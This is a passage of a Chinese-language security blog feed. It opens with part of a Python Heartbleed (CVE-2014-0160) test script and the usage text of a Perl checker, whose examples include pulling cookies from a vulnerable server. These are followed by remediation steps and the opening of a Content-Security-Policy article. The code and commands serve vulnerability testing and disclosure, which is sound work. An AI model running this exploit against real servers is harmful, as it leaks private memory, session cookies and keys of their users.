            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# EOF?
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt;
        

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Unexpected EOF receiving record header - server closed connection&apos;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&amp;gt;BHH&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Unexpected EOF receiving record payload - server closed connection&apos;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos; ... received message: type = %d, ver = %04x, length = %d&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;No heartbeat response received, server likely not vulnerable&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Received heartbeat response:&apos;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;WARNING: server returned more data than it should - server is vulnerable!&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server processed malformed heartbeat, but did not return any extra data.&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Received alert:&apos;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server returned error, likely not vulnerable&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Connecting...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Sending Client Hello...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Waiting for Server Hello...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Server closed connection without sending Server Hello.&apos;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;# Look for server hello done message.
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;Sending heartbeat request...&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;__main__&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;自我測試工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用方法直接執行「perl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443」，可在網域名稱後指定特定 SSL 連接埠。&lt;/p&gt;

&lt;p&gt;使用說明：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)
Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port
  --starttls proto[:arg] - start plain and upgrade to SSL with
			   starttls protocol (imap,smtp,http,pop)
  -T|--timeout T         - use timeout (default 5)
  -H|--heartbeats N      - number of heartbeats (default 1)
  -s|--show-data [L]     - show heartbeat response if vulnerable, optional
                           parameter L specifies number of bytes per line (16)
  -R|--show-regex-data R - show data matching perl regex R. Option can be
                           used multiple times
  -q|--quiet             - don&apos;t show anything, exit 1 if vulnerable
  -h|--help              - this screen

Examples:
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check direct www, imaps .. server
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:443
  check-ssl-heartbleed.pl www.google.com:https
  check-ssl-heartbleed.pl mail.google.com:imaps

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;try to get Cookies
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl -R &apos;Cookie:.*&apos; www.broken-site.com:443

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check webserver via proxy
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check imap server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check pop server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;  #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;check smtp server, start with plain and upgrade
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587
  &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;應對措施&quot;&gt;應對措施&lt;/h3&gt;

&lt;p&gt;如果發現自己的伺服器有這樣的漏洞，該怎麼辦呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;確認自己的 OpenSSL 版本是否在受害範圍&lt;/li&gt;
  &lt;li&gt;使用 ssltest.py 檢測工具檢測是否含有漏洞&lt;/li&gt;
  &lt;li&gt;更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2&lt;/li&gt;
  &lt;li&gt;重開所有與 OpenSSL 函式庫相關之服務&lt;/li&gt;
  &lt;li&gt;重新產生 SSL Private Key (因為 Private Key 可能藉由漏洞外洩)&lt;/li&gt;
  &lt;li&gt;將網站舊憑證撤銷&lt;/li&gt;
  &lt;li&gt;清除所有目前網頁伺服器上的 Session （因為可能遭到竊取）&lt;/li&gt;
  &lt;li&gt;必要時更換網站內使用者密碼，或是密切追蹤網站是否有帳號盜用的情況發生&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;詳細討論與建議可以參考
Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&quot;&gt;http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;誰會是目標呢&quot;&gt;誰會是目標呢？&lt;/h3&gt;

&lt;p&gt;真的會有攻擊者利用這樣的攻擊手法嗎？目前在&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲 wooyun&lt;/a&gt;平台上已經滿滿的資安研究員開始回報網站含有 OpenSSL 漏洞。也有駭客在嘗試撰寫更有效的攻擊利用程式，想要藉此把平常打不下來的網站一舉攻陷。&lt;/p&gt;

&lt;p&gt;怎樣的站台會是重點目標呢？含有會員機制的網站特別如此，例如 Web Mail、社群網站等等。因此不少企業要多注意了，例如全世界最大的社群網站 Facebook、SlideShare、台灣知名電信公司網站、社交平台、網路銀行、NAS，都會在這波的攻擊範圍之內。如果沒有儘速修復，等到更有效的攻擊程式出現，就真的等著失血了。&lt;/p&gt;

&lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;就連 OpenSSL 這種歷史悠久而且重要的函式庫，都可能犯這種基本的 C 語言程式設計錯誤，老舊的程式碼一定有不少陳年遺毒，如果沒有徹底清查，類似的心臟噴血事件會不斷上演。大家快點止血吧！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/</link>
                <guid>https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160</guid>
                <pubDate>Wed, 09 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Content-Security-Policy - HTTP Headers 的資安議題 (2)</title>
                <description>&lt;h3 id=&quot;content-security-policy&quot;&gt;Content-Security-Policy&lt;/h3&gt;

&lt;p&gt;還記得在上一篇 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers 的資安議題 (1)&lt;/a&gt; 文章中，我們提到了多種資安相關的 HTTP headers 嗎？接下來的幾篇文章我們會介紹幾個專門對付 XSS 的 HTTP headers，首先就由 Content-Security-Policy 打頭陣。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;（以下簡稱 CSP）是從 2010 年被提出來的一項 Web 規格，主要目的是用來防止 Cross-Site Scripting（以下簡稱 XSS）跟網頁樣式置換（例如&lt;a href=&quot;https://web.archive.org/web/20140321184408/http://udn.com:80/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;科技部被惡搞&lt;/a&gt;就是一個最好的例子）。經過五年發展，CSP 1.0 已從 W3C 的 TR (Technical Report) 變成 &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;，應該不久就會將成為 W3C 推薦標準。新的 &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; 則仍在草案階段。&lt;/p&gt;

&lt;p&gt;CSP 家族龐大，總共有三個類別，六個項目：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy&lt;/li&gt;
  &lt;li&gt;X-Content-Security-Policy-Report-Only&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP&lt;/li&gt;
  &lt;li&gt;X-WebKit-CSP-Report-Only&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在 CSP 發展初期，主流瀏覽器並未全部依照同一標準來開發，因此發展成這三種類別。目前由於 CSP 1.0 即將成為標準，大多數瀏覽器已支援 Content-Security-Policy 這個類別，因此狀況已逐漸收斂。主流瀏覽器的支援列表如下圖：&lt;/p&gt;

